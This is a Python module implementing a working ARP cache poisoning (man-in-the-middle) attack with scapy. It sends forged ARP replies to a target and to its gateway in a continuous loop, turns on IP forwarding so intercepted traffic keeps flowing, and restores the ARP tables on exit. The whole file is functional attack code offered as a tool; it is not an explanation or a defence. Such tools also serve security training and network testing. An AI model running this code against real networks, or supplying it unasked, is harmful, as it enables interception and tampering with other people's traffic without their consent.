"""ARP cache poisoning (man-in-the-middle) attack and table restoration."""

import logging
import time

import scapy.all as scapy

from .utils import get_mac, set_ip_forwarding

log = logging.getLogger("arpspoofer")


def spoof(target_ip, spoof_ip, iface=None, target_mac=None):
    """Tell `target_ip` that `spoof_ip` is at our MAC address.

    Returns the target MAC on success, or None if the target is unreachable.
    """
    if target_mac is None:
        target_mac = get_mac(target_ip, iface=iface)
    if target_mac is None:
        return None

    # Build at Layer 2: address the Ethernet frame directly to the victim and
    # send with sendp() so the chosen interface is honoured (scapy.send() at L3
    # ignores iface and warns about the missing Ethernet destination MAC).
    # op=2 is an ARP reply; we omit ARP hwsrc so scapy fills in our own MAC.
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
    )
    scapy.sendp(packet, iface=iface, verbose=False)
    return target_mac


def restore(dest_ip, source_ip, iface=None, count=4):
    """Repair `dest_ip`'s ARP table by broadcasting the real MAC of source_ip."""
    dest_mac = get_mac(dest_ip, iface=iface)
    source_mac = get_mac(source_ip, iface=iface)
    if dest_mac is None or source_mac is None:
        log.warning(
            "Skipping restore for %s -> %s; could not resolve both MACs.",
            dest_ip,
            source_ip,
        )
        return False

    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.sendp(packet, count=count, iface=iface, verbose=False)
    return True


def run(target_ip, gateway_ip, iface=None, interval=2, forward=True):
    """Continuously poison both target and gateway until interrupted.

    Verifies both hosts are reachable before starting, optionally enables IP
    forwarding, and always restores the ARP tables on exit.
    """
    log.info("Resolving target and gateway before starting...")
    target_mac = get_mac(target_ip, iface=iface)
    gateway_mac = get_mac(gateway_ip, iface=iface)
    if target_mac is None or gateway_mac is None:
        log.error("Aborting: target or gateway is unreachable.")
        return 1

    log.info("Target  %s is at %s", target_ip, target_mac)
    log.info("Gateway %s is at %s", gateway_ip, gateway_mac)

    forwarding_enabled = set_ip_forwarding(True) if forward else False
    sent = 0
    try:
        log.info("Poisoning ARP caches (Ctrl+C to stop and restore)...")
        while True:
            # Tell the gateway we are the target, and the target we are the gateway.
            spoof(gateway_ip, target_ip, iface=iface, target_mac=gateway_mac)
            spoof(target_ip, gateway_ip, iface=iface, target_mac=target_mac)
            sent += 2
            print(f"[+] Packets sent: {sent}", end="\r", flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        print()
        log.info("Interrupted - restoring ARP tables, please wait...")
    finally:
        restore(target_ip, gateway_ip, iface=iface)
        restore(gateway_ip, target_ip, iface=iface)
        if forwarding_enabled:
            set_ip_forwarding(False)
        log.info("Done. ARP tables restored.")
    return 0
